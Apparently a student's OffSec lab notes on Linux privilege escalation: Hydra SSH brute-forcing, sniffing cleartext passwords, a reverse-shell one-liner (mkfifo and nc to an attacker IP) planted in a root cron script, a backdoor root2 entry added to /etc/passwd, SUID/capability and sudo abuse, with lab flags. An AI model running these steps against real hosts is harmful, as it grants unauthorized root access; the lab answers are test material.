+┌──(m4xx3d0ut㉿h4ckt0p)-[~/OffSec/lin-priv-esc]
+└─$ head wordlist                                     
+Lab000
+Lab001
+Lab002
+Lab003
+Lab004
+Lab005
+Lab006
+Lab007
+Lab008
+Lab009
+</code></pre>
+<p>Since the target runs an SSH server, we can attempt our attack with Hydra.</p>
+<ul>
+<li>username <code>-l</code></li>
+<li>wordlist <code>-P</code></li>
+<li>target IP</li>
+<li>set target as <code>ssh</code></li>
+<li>verbose <code>-V</code></li>
+</ul>
+<pre><code class="language-bash">┌──(m4xx3d0ut㉿h4ckt0p)-[~/OffSec/lin-priv-esc]
+└─$ hydra -l eve -P wordlist 192.168.234.214 -t 4 ssh -V             
+Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-11-01 07:19:28
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 1000 login tries (l:1/p:1000), ~250 tries per task
+[DATA] attacking ssh://192.168.234.214:22/
+...
+[22][ssh] host: 192.168.50.214   login: eve   password: Lab123
+1 of 1 target successfully completed, 1 valid password found
+</code></pre>
+<p>Hydra succeeds and we can login as <code>eve</code> via SSH:</p>
+<pre><code class="language-bash">┌──(m4xx3d0ut㉿h4ckt0p)-[~/OffSec/lin-priv-esc]
+└─$ ssh -o PubKeyAuthentication=no eve@192.168.234.214
+eve@192.168.234.214&#39;s password: 
+Linux debian-privesc 4.19.0-21-amd64 #1 SMP Debian 4.19.249-2 (2022-06-30) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Fri Sep 30 05:16:08 2022 from 127.0.0.1
+eve@debian-privesc:~$ whoami
+eve
+</code></pre>
+<p>We can verify we are running as a priv user with <code>sudo -l</code></p>
+<pre><code class="language-bash">┌──(m4xx3d0ut㉿h4ckt0p)-[~/OffSec/lin-priv-esc]
+└─$ ssh -o PubKeyAuthentication=no eve@192.168.234.214
+eve@192.168.234.214&#39;s password: 
+Linux debian-privesc 4.19.0-21-amd64 #1 SMP Debian 4.19.249-2 (2022-06-30) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Fri Sep 30 05:16:08 2022 from 127.0.0.1
+eve@debian-privesc:~$ whoami
+eve
+eve@debian-privesc:~$ sudo -l
+[sudo] password for eve: 
+Matching Defaults entries for eve on debian-privesc:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User eve may run the following commands on debian-privesc:
+    (ALL : ALL) ALL
+</code></pre>
+<p>Since <code>eve</code> is an admin user, we can run commands with elev priv.  We can elevate to root with <code>sudo -i</code></p>
+<pre><code class="language-bash">eve@debian-privesc:~$ sudo -i
+root@debian-privesc:~# whoami
+root
+</code></pre>
+<h3>Inspecting Service Footprints</h3>
+<p>System daemons are Linux services, spawned at boot, to perform specific tasks without user interaction.  Linux servers often start many daemons:</p>
+<ul>
+<li>SSH</li>
+<li>Web server</li>
+<li>DB</li>
+<li>etc.
+Sys admins often rely on custom daemons to automate tasks and often neglect security best-practices.  As part of enum, we inspect the behavior of running procs to hunt for anomalies the may lead to PrivEsc.</li>
+</ul>
+<p>Unlike Win, Linux sllows us to list info about higher-priv procs like those running in the root context.  We can enum all procs with <code>ps</code> , refresh every second with <code>watch</code>, and <code>grep</code> for the word &quot;pass&quot;:</p>
+<pre><code class="language-bash">joe@debian-privesc:~$ watch -n 1 &quot;ps -aux | grep pass&quot;
+...
+
+joe      16867  0.0  0.1   6352  2996 pts/0    S+   05:41   0:00 watch -n 1 ps -aux | grep pass
+root     16880  0.0  0.0   2384   756 ?        S    05:41   0:00 sh -c sshpass -p &#39;Lab123&#39; ssh  -t eve@127.0.0.1 &#39;sleep 5;exit&#39;
+root     16881  0.0  0.0   2356  1640 ?        S    05:41   0:00 sshpass -p zzzzzz ssh -t eve@127.0.0.1 sleep 5;exit
+...
+</code></pre>
+<ul>
+<li>the admin has configured a sys daemon to conn to local sys with the <code>eve</code> user creds in clear text</li>
+<li>the proc is running as root, but we can still inspect it</li>
+</ul>
+<p>Another holistic angle we should consider, is if we have the ability to capture network traffic.  For CLI packet capture we can use <code>tcpdump</code>, it requires admin priv as it operates on raw sockets.  It is not uncommon to find IT accounts have been given access to this tool for troubleshooting.</p>
+<p>We can run <code>tcpdump</code> as user <code>joe</code> who has specific sudo perms to run it.  Let&#39;s try to capture traffic on the loopback iface:</p>
+<ul>
+<li>dump contents in ASCII with <code>-A</code></li>
+<li>filter for &quot;pass&quot; with <code>grep</code></li>
+</ul>
+<pre><code class="language-bash">joe@debian-privesc:~$ sudo tcpdump -i lo -A | grep &quot;pass&quot;
+[sudo] password for joe: 
+tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
+listening on lo, link-type EN10MB (Ethernet), capture size 262144 bytes
++...+...user:root,pass:lab -
++...+...user:root,pass:lab -
+</code></pre>
+<ul>
+<li>after several seconds we get the root user pass in clear text!</li>
+</ul>
+<h2>Insecure File Permissions 17.3</h2>
+<ul>
+<li>Abuse insecure cron jobs to escalate privileges</li>
+<li>Abuse insecure file permissions to escalate privileges</li>
+</ul>
+<h3>Abusing Cron Jobs</h3>
+<p>Insecure file perms can be leveraged for PrivEsc.  Assume we already gained access to a Linux target as an unpriv user.</p>
+<p>To leverage, we must locate an exec file that allows us write access and runs at elev priv.  The cron time based job scheduler is a prime target.  Sys level cron jobs exec with root priv and sys admins often create scripts with insecure perms.</p>
+<p>SSH into our example target VM1 as <code>joe</code> user and check for installed cron jobs.</p>
+<pre><code class="language-bash">joe@debian-privesc:~$ crontab -l
+# Edit this file to introduce tasks to be run by cron.
+...
+# m h  dom mon dow   command
+
+joe@debian-privesc:~$ sudo crontab -l
+[sudo] password for joe: 
+...
+# m h  dom mon dow   command
+* * * * * /bin/bash /home/joe/.scripts/user_backups.sh
+joe@debian-privesc:~$ grep &quot;CRON&quot; /var/log/syslog
+Nov  1 10:11:46 debian-privesc CRON[1226]: (root) CMD (/bin/bash /home/joe/.scripts/user_backups.sh)
+Nov  1 10:12:01 debian-privesc CRON[1280]: (root) CMD (/bin/bash /home/joe/.scripts/user_backups.sh)
+</code></pre>
+<ul>
+<li>a script <code>user_backup.sh</code> under <code>/home/joe</code> is exec in root context.</li>
+<li>it appears to run every minute</li>
+</ul>
+<p>We can inspect the contents of the script:</p>
+<pre><code class="language-bash">joe@debian-privesc:~$ cat .scripts/user_backups.sh 
+#!/bin/bash
+
+cp -rf /home/joe/ /var/backups/joe/
+
+joe@debian-privesc:~$ ls -lha .scripts/user_backups.sh 
+-rwxrwxrw- 1 root root 50 Aug 25  2022 .scripts/user_backups.sh
+</code></pre>
+<ul>
+<li>the script copies the user&#39;s home dir to the backups subdir.</li>
+<li>the perms show local users can write to the file</li>
+</ul>
+<p>Since an unpriv user can modify the contents of the backup script, we can edit and add a reverse shell one-liner.  If it succeeds, we will receive a root priv rev shell on our attacking machine after one minute at most.</p>
+<pre><code class="language-bash">joe@debian-privesc:~/.scripts$ cat user_backups.sh 
+#!/bin/bash
+
+cp -rf /home/joe/ /var/backups/joe/
+
+
+joe@debian-privesc:~/.scripts$ echo &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.45.182 4444 &gt;/tmp/f&quot; &gt;&gt; user_backups.sh 
+joe@debian-privesc:~/.scripts$ cat user_backups.sh 
+#!/bin/bash
+
+cp -rf /home/joe/ /var/backups/joe/
+
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.45.182 4444 &gt;/tmp/f
+</code></pre>
+<p>Start the listener on our attacking machine.</p>
+<pre><code class="language-bash">┌──(m4xx3d0ut㉿h4ckt0p)-[~/OffSec/lin-priv-esc]
+└─$ nc -nvlp 4444
+listening on [any] 4444 ...
+connect to [192.168.45.182] from (UNKNOWN) [192.168.248.214] 35340
+/bin/sh: 0: can&#39;t access tty; job control turned off
+# id
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre>
+<p>As shown, the cron job executed our reverse shell one-liner and we achieve PrivEsc with a root shell on the target.</p>
+<h3>Abusing Password Authentication</h3>
+<p>Passwords are generally stored in <code>/etc/shadow</code> (not readable by normal user) when there are no centralized credential systems, such as AD or LDAP, in use.  Historically, hashes and account info were stored in the world readable <code>/etc/passwd</code>.  For backwards compatibility, if a password hash is present in the second column of an <code>/etc/passwd</code> user record it is valid for auth and takes precedence over the entry in <code>/etc/shadow</code> if present.  Therefore, if we can write into <code>/etc/passwd</code> we can set an arbitrary password for any account.</p>
+<p>Previously we have seen that the Debian Vm may be vulnerable to PrivEsc due to <code>/etc/passwd</code> perms being improperly set.  We can PrivEsc by adding another superuser, <code>root2</code>, and corresponding password hash to <code>/etc/passwd</code>.</p>
+<ul>
+<li>generate password hash with <code>openssl</code><ul>
+<li>using arg <code>passwd</code></li>
+<li>if no other option is specified, the hash will be generated with <a href="https://en.wikipedia.org/wiki/Crypt_(C)">crypt algorithm</a><ul>
+<li>a supported hash for Linux auth</li>
+<li><em>The output of the OpenSSL passwd command may vary depending on the system executing it. On older systems, it may default to the DES algorithm, while on some newer systems it could output the password in MD5 format.</em></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>we then add the line to <code>/etc/passwd</code></li>
+</ul>
+<pre><code class="language-bash">joe@debian-privesc:~$ openssl passwd w00t
+bAoT00dpc4dtE
+joe@debian-privesc:~$ echo &quot;root2:bAoT00dpc4dtE:0:0:root:/root:/bin/bash&quot; &gt;&gt; /etc/passwd
+joe@debian-privesc:~$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
+tss:x:105:111:TPM2 software stack,,,:/var/lib/tpm:/bin/false
+dnsmasq:x:106:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+rtkit:x:108:114:RealtimeKit,,,:/proc:/usr/sbin/nologin
+sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
+pulse:x:110:118:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
+speech-dispatcher:x:111:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
+avahi:x:112:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
+saned:x:113:121::/var/lib/saned:/usr/sbin/nologin
+colord:x:114:122:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
+geoclue:x:115:123::/var/lib/geoclue:/usr/sbin/nologin
+hplip:x:116:7:HPLIP system user,,,:/var/run/hplip:/bin/false
+Debian-gdm:x:117:124:Gnome Display Manager:/var/lib/gdm3:/bin/false
+joe:x:1000:1000:joe,,,:/home/joe:/bin/bash
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+eve:x:1001:1001:,,,:/home/eve:/bin/bash
+lightdm:x:118:125:Light Display Manager:/var/lib/lightdm:/bin/false
+root2:bAoT00dpc4dtE:0:0:root:/root:/bin/bash
+
+joe@debian-privesc:~$ su root2
+Password: 
+root@debian-privesc:/home/joe# id
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre>
+<p>As shown we have added <code>root2</code> with password <code>w00t</code> to <code>/etc/passwd</code>.  We then use <code>su</code> to switch to our new user and issue <code>id</code> to show that we have gained root privs.</p>
+<p>It may seem unlikely to find <code>/etc/passwd</code> world-writeable, but there are many cases where security is compromised for usability.</p>
+<h4>Exercises</h4>
+<p>Connect to VM 2 and get the flag by elevating to a root shell through password authentication abuse.</p>
+<pre><code class="language-bash">┌──(m4xx3d0ut㉿h4ckt0p)-[~/OffSec/lin-priv-esc]
+└─$ ssh -o PubKeyAuthentication=no joe@192.168.248.214
+joe@192.168.248.214&#39;s password: 
+Linux debian-privesc 4.19.0-21-amd64 #1 SMP Debian 4.19.249-2 (2022-06-30) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Wed Feb 15 04:15:11 2023 from 192.168.118.3
+joe@debian-privesc:~$ find /etc -writable -type d 2&gt;/dev/null
+joe@debian-privesc:~$ ls -lha /etc/passwd
+-rw-r--rw- 1 root root 2.3K Aug 29  2022 /etc/passwd
+joe@debian-privesc:~$ ls -lha /etc/shadow
+-rw-r----- 1 root shadow 1.5K Nov  1 23:13 /etc/shadow
+joe@debian-privesc:~$ openssl passwd w00t
+IQQxizB3p9wXE
+joe@debian-privesc:~$ echo &quot;root2:IQQxizB3p9wXE:0:0:root:/root:/bin/bash&quot; &gt;&gt; /etc/passwd
+joe@debian-privesc:~$ tail /etc/passwd
+saned:x:113:121::/var/lib/saned:/usr/sbin/nologin
+colord:x:114:122:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
+geoclue:x:115:123::/var/lib/geoclue:/usr/sbin/nologin
+hplip:x:116:7:HPLIP system user,,,:/var/run/hplip:/bin/false
+Debian-gdm:x:117:124:Gnome Display Manager:/var/lib/gdm3:/bin/false
+joe:x:1000:1000:joe,,,:/home/joe:/bin/bash
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+eve:x:1001:1001:,,,:/home/eve:/bin/bash
+lightdm:x:118:125:Light Display Manager:/var/lib/lightdm:/bin/false
+root2:IQQxizB3p9wXE:0:0:root:/root:/bin/bash
+joe@debian-privesc:~$ su root2
+Password: 
+root@debian-privesc:/home/joe# id
+uid=0(root) gid=0(root) groups=0(root)
+root@debian-privesc:/home/joe# ls /root/
+flag.txt
+root@debian-privesc:/home/joe# cat /root/flag.txt 
+OS{965ad9ef01013eda6edc9fff6e8e7e5e}
+</code></pre>
+<h2>Insecure System Components 17.4</h2>
+<ul>
+<li>Abuse SUID programs and capabilities for privilege escalation</li>
+<li>Circumvent special sudo permissions to escalate privileges</li>
+<li>Enumerate the system&#39;s kernel for known vulnerabilities, then abuse them for privilege escalation</li>
+</ul>
+<h3>Abusing Setuid Binaries and Capabilities</h3>
+<p>As we saw earlier, <code>setuid</code> binaries can lead to PrivEsc when not properly secured.  Before we attempt the exploit let&#39;s review the purpose behind a setuid binary with an example.</p>
+<p>When a user or a system-automated script launches a proc, it inherits the UID/GUID of the initiating script, known as the real UID/GID.</p>
+<p>User password hashes within <code>/etc/shadow</code>, owned by root (uid=0).  How can a non-priv user access the file to change their own password?  To circumvent, the effective UID/GID was introduced, representing the actual value that is checked when performing priv operations.</p>
+<p>Let&#39;s analyze the <code>passwd</code> program, responsible for changing the password for the user who executes it.  On our Debian lab machine, we&#39;ll connect as <code>joe</code> and execute the <code>passwd</code> command without typing anything afterwards (keeping the process in active memory).</p>
+<pre><code class="language-bash">joe@debian-privesc:~$ passwd
+Changing password for joe.
+Current password: 
+</code></pre>
+<p>Open another shell to further inspect the process.  We can find the PID of the <code>passwd</code> proc by listing processes and filtering out the target name.</p>
+<pre><code class="language-bash">joe@debian-privesc:~$ ps -u -C passwd
+error: user name does not exist
+
+Usage:
+ ps [options]
+
+ Try &#39;ps --help &lt;simple|list|output|threads|misc|all&gt;&#39;
+  or &#39;ps --help &lt;s|l|o|t|m|a&gt;&#39;
+ for additional help text.
+
+For more details see ps(1).
+joe@debian-privesc:~$ ps u -C passwd
+USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+root      1324  0.0  0.1   9364  2996 pts/0    S+   23:31   0:00 passwd
+</code></pre>
+<ul>
+<li>as we see <code>passwd</code> is running as the root user<ul>
+<li>necessary for it to access and modify <code>/etc/shadow</code></li>
+</ul>
+</li>
+</ul>
+<p>We can also inspect the real UID and effective UID assigned for the proc by inspecting the proc pseudo-filesystem, which allows us to interact with kernel info.  Using the passwd&#39;s PID (1324) from previous output, we can inspect the content at <code>/proc/1932/status</code> which provides a summary of the process attributes.</p>
+<pre><code class="language-bash">joe@debian-privesc:~$ cat /proc/1324/status
+Name:	passwd
+Umask:	0077
+State:	S (sleeping)
+Tgid:	1324
+Ngid:	0
+Pid:	1324
+PPid:	1251
+TracerPid:	0
+Uid:	1000	0	0	0
+Gid:	1000	1000	1000	1000
+FDSize:	256
+Groups:	24 25 29 30 44 46 109 112 116 117 1000 
+NStgid:	1324
+NSpid:	1324
+NSpgid:	1324
+NSsid:	1251
+VmPeak:	    9460 kB
+VmSize:	    9364 kB
+VmLck:	       0 kB
+VmPin:	       0 kB
+VmHWM:	    2996 kB
+VmRSS:	    2996 kB
+RssAnon:	     304 kB
+RssFile:	    2692 kB
+RssShmem:	       0 kB
+VmData:	     596 kB
+VmStk:	     132 kB
+VmExe:	      40 kB
+VmLib:	    2408 kB
+VmPTE:	      52 kB
+VmSwap:	       0 kB
+HugetlbPages:	       0 kB
+CoreDumping:	0
+Threads:	1
+SigQ:	0/7820
+SigPnd:	0000000000000000
+ShdPnd:	0000000000000000
+SigBlk:	0000000000080000
+SigIgn:	0000000000287007
+SigCgt:	0000000180000000
+CapInh:	0000000000000000
+CapPrm:	0000003fffffffff
+CapEff:	0000003fffffffff
+CapBnd:	0000003fffffffff
+CapAmb:	0000000000000000
+NoNewPrivs:	0
+Seccomp:	0
+Speculation_Store_Bypass:	thread vulnerable
+Cpus_allowed:	3
+Cpus_allowed_list:	0-1
+Mems_allowed:	00000000,00000001
+Mems_allowed_list:	0
+voluntary_ctxt_switches:	4
+nonvoluntary_ctxt_switches:	3
+</code></pre>
+<p>the <code>passwd</code> bin behaves this way because of a special flag called Set-User-ID, SUID for short.</p>
+<pre><code class="language-bash">joe@debian-privesc:~$ ls -asl /usr/bin/passwd 
+64 -rwsr-xr-x 1 root root 63736 Jul 27  2018 /usr/bin/passwd
+</code></pre>
+<ul>
+<li>the SUID flag is the <code>s</code> in the above output<ul>
+<li>the flag can be configured with <code>chmod u+s &lt;fname&gt;</code></li>
+<li>it sets the eUID of the proc to the exec owner UID (root)</li>
+</ul>
+</li>
+</ul>
+<p>The result is legitimate constrained PrivEsc, the SUID bin must be bug-free to avoid any misuse of the app.</p>
+<p>A practical example, after completing manual enum, we&#39;ll have discovered that the <code>find</code> utility is misconfigured and has the SUID flag set.</p>
+<ul>
+<li>we can abuse this by using <code>find</code> to search well-known file, like our Desktop folder<ul>
+<li>once the file is found we can have <code>find</code> perform an action through the <code>-exec</code> param</li>
+</ul>
+</li>
+<li>we want to exec a bash shell along with the <a href="https://www.gnu.org/software/bash/manual/html_node/The-Set-Builtin.html">Set Builtin</a> <code>-p</code> param<ul>
+<li>preventing the effective user from being reset</li>
+</ul>
+</li>
+</ul>
+<pre><code class="language-bash">joe@debian-privesc:~$ find /home/joe/Desktop/ -exec &quot;/usr/bin/bash&quot; -p \;
+bash-5.0# id
+uid=1000(joe) gid=1000(joe) euid=0(root) groups=1000(joe),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),112(bluetooth),116(lpadmin),117(scanner)
+bash-5.0# whoami
+root
+bash-5.0# which find
+/usr/bin/find
+bash-5.0# ls -asl /usr/bin/find
+312 -rwsr-xr-x 1 root root 315904 Feb 16  2019 /usr/bin/find
+</code></pre>
+<ul>
+<li>we observe that the UID still belongs to <code>joe</code><ul>
+<li>the eUID is now <code>root</code></li>
+</ul>
+</li>
+</ul>
+<p>Another set of features subject to PrivEsc are <a href="https://man7.org/linux/man-pages/man7/capabilities.7.html">Linux capabilities</a></p>
+<ul>
+<li>capabilities are extra attributes that can be applied to<ul>
+<li>procs</li>
+<li>bins</li>
+<li>services</li>
+</ul>
+</li>
+<li>they assign specific privs normally reserved for admin ops<ul>
+<li>traffic capture</li>
+<li>manipulating kernel modules</li>
+<li>etc</li>
+</ul>
+</li>
+</ul>
+<p>Similar to SUID bins, if misconfigued capabilities could allow an attacker to elevate their privs to root.  To demonstrate let&#39;s manually enum our target for bins with capabilities.</p>
+<ul>
+<li>run <code>getcap</code></li>
+<li>recursive search <code>-r</code></li>
+<li>from root folder <code>/</code></li>
+<li>filtering out errors from output</li>
+</ul>
+<pre><code class="language-bash">joe@debian-privesc:~$ /usr/sbin/getcap -r / 2&gt;/dev/null
+/usr/bin/ping = cap_net_raw+ep
+/usr/bin/perl = cap_setuid+ep
+/usr/bin/perl5.28.1 = cap_setuid+ep
+/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
+/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
+</code></pre>
+<ul>
+<li>two <code>perl</code> bins stand out<ul>
+<li>they have <code>setuid</code> capabilities</li>
+<li>effective and permitted <code>+ep</code>
+<em>Even though they seem similar, capabilities, setuid, and the setuid flag are located in different places within the Linux ELF file format.</em></li>
+</ul>
+</li>
+</ul>
+<p>To exploit this miscofig, we could check the GTFOBins website, which provides an organized list of UNIX bins and how they can be misused for PrivEsc.</p>
+<ul>
+<li><a href="https://gtfobins.github.io/">GTFOBins</a>
+We search for &quot;Perl&quot; and find precise instructions on how to exploit the capabilities.  We&#39;ll use the command which executes a shell along with POSIX directives enabling setuid.</li>
+</ul>
+<pre><code class="language-bash">joe@debian-privesc:~$ perl -e &#39;use POSIX qw(setuid); POSIX::setuid(0); exec &quot;/bin/sh&quot;;&#39;
+# id
+uid=0(root) gid=1000(joe) groups=1000(joe),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),112(bluetooth),116(lpadmin),117(scanner)
+# whoami
+root
+</code></pre>
+<h4>Exercises</h4>
+<p>Connect to VM 2 and gain a root shell by abusing capabilities.</p>
+<pre><code class="language-bash">joe@debian-privesc:~$ /usr/sbin/getcap -r / 2&gt;/dev/null
+/usr/bin/gdb = cap_setuid+ep
+/usr/bin/ping = cap_net_raw+ep
+/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
+/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
+joe@debian-privesc:~$ which gdb
+/usr/bin/gdb
+joe@debian-privesc:~$ /usr/bin/gdb -nx -ex &#39;python import os; os.setuid(0)&#39; -ex &#39;!sh&#39; -ex quit
+GNU gdb (Debian 8.2.1-2+b3) 8.2.1
+Copyright (C) 2018 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.
+Type &quot;show copying&quot; and &quot;show warranty&quot; for details.
+This GDB was configured as &quot;x86_64-linux-gnu&quot;.
+Type &quot;show configuration&quot; for configuration details.
+For bug reporting instructions, please see:
+&lt;http://www.gnu.org/software/gdb/bugs/&gt;.
+Find the GDB manual and other documentation resources online at:
+    &lt;http://www.gnu.org/software/gdb/documentation/&gt;.
+
+For help, type &quot;help&quot;.
+Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;.
+# id
+uid=0(root) gid=1000(joe) groups=1000(joe),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),112(bluetooth),116(lpadmin),117(scanner)
+# whoami
+root
+# ls /root	
+flag.txt
+# cat /root/flag.txt
+OS{e9dad60560a182bf3fb999ddb1a7d059}
+</code></pre>
+<h3>Abusing Sudo</h3>
+<p>On UNIX like systems, <code>sudo</code> can be used to exec a command with elevated privs.  To use <code>sudo</code> our un-priv user must be a member of the sudo group (Debian based distros).  The word sudo stands for &quot;Superuser-Do&quot;, think of it as changing the eUID of the executed command.</p>
+<p>Custom configs of the sudo-related perms can be applied in the <code>/etc/sudoers</code> file.  We can use the <code>-l</code> or <code>--list</code> option to list the allowed commands for the current user.</p>
+<pre><code class="language-bash">joe@debian-privesc:~$ sudo -l
+[sudo] password for joe: 
+Matching Defaults entries for joe on debian-privesc:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User joe may run the following commands on debian-privesc:
+    (ALL) /usr/bin/crontab -l, /usr/sbin/tcpdump, /usr/bin/apt-get
+</code></pre>
+<ul>
+<li>we see that <code>crontab</code>, <code>tcpdump</code>, and <code>apt-get</code> are allowing sudo commands</li>
+</ul>
+<p>If the <code>/etc/sudoers</code> configs are too permissive user&#39;s could abuse to obtain permanent root.</p>
+<p>Since the first of the 3 permitted commands does not allow us to edit <code>crontab</code> it&#39;s unlikely we can use it for PrivEsc.  The second command looks more promising so we browse GTFOBins for suggestions.  Running the command reveals an unexpected outcome.</p>
+<pre><code class="language-bash">joe@debian-privesc:~$ sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
+dropped privs to root
+tcpdump: listening on lo, link-type EN10MB (Ethernet), capture size 262144 bytes
+Maximum file limit reached: 1
+1 packet captured
+62 packets received by filter
+0 packets dropped by kernel
+compress_savefile: execlp(/tmp/tmp.zkRMfxFPP3, /dev/null) failed: Permission denied
+</code></pre>
+<ul>
+<li>we are prompted with a &quot;permission denied&quot; error</li>
+</ul>
+<p>To investigate, inspect <code>syslog</code> for any occurrence of <code>tcpdump</code></p>
+<pre><code class="language-bash">joe@debian-privesc:~$ cat /var/log/syslog | grep tcpdump
+Nov  2 10:09:07 debian-privesc kernel: [  773.917028] audit: type=1400 audit(1698937747.856:24): apparmor=&quot;DENIED&quot; operation=&quot;exec&quot; profile=&quot;/usr/sbin/tcpdump&quot; name=&quot;/tmp/tmp.zkRMfxFPP3&quot; pid=2453 comm=&quot;tcpdump&quot; requested_mask=&quot;x&quot; denied_mask=&quot;x&quot; fsuid=0 ouid=1000
+</code></pre>
+<ul>
+<li><a href="https://man7.org/linux/man-pages/man8/auditd.8.html">audit</a><ul>
+<li>audit daemon logged our attempt</li>
+</ul>
+</li>
+<li><a href="https://apparmor.net/">AppArmor</a><ul>
+<li>was triggered blocking us</li>
+</ul>
+</li>
+</ul>
+<p>AppArmor is a kernel module providing mandatory access control (MAC) on Linux systems by running app specific profiles, it&#39;s enabled by default on Debian 10.  We can verify AppArmor&#39;s status as the root user using the <code>aa-status</code> command.</p>
+<pre><code class="language-bash">joe@debian-privesc:~$ su - root
+Password:
+root@debian-privesc:~# aa-status
+apparmor module is loaded.
+20 profiles are loaded.
+18 profiles are in enforce mode.
+   /usr/bin/evince
+   /usr/bin/evince-previewer
+   /usr/bin/evince-previewer//sanitized_helper
+   /usr/bin/evince-thumbnailer
+   /usr/bin/evince//sanitized_helper
+   /usr/bin/man
+   /usr/lib/cups/backend/cups-pdf
+   /usr/sbin/cups-browsed
+   /usr/sbin/cupsd
+   /usr/sbin/cupsd//third_party
+   /usr/sbin/tcpdump
+...
+2 profiles are in complain mode.
+   libreoffice-oopslash
+   libreoffice-soffice
+3 processes have profiles defined.
+3 processes are in enforce mode.
+   /usr/sbin/cups-browsed (502)
+   /usr/sbin/cupsd (654)
+   /usr/lib/cups/notifier/dbus (658) /usr/sbin/cupsd
+0 processes are in complain mode.
+0 processes are unconfined but have a profile defined.
+</code></pre>
+<ul>
+<li>we can see <code>tcpdump</code> is protected with an AppArmor profile</li>
+</ul>
+<p>The first two sudoers commands did not work, we check the third command <code>apt-get</code>.</p>
+<pre><code class="language-bash">sudo apt-get changelog apt
+!/bin/sh
+</code></pre>
+<ul>
+<li>runs the <code>apt-get</code> changelog command<ul>
+<li>invoking <code>less</code> app from which we exec a bash shell</li>
+</ul>
+</li>
+</ul>
+<pre><code class="language-bash">joe@debian-privesc:~$ sudo apt-get changelog apt
+Get:1 store: apt 1.8.2.3 Changelog
+Fetched 459 kB in 0s (0 B/s)
+# id
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre>
+<h4>Exercises</h4>
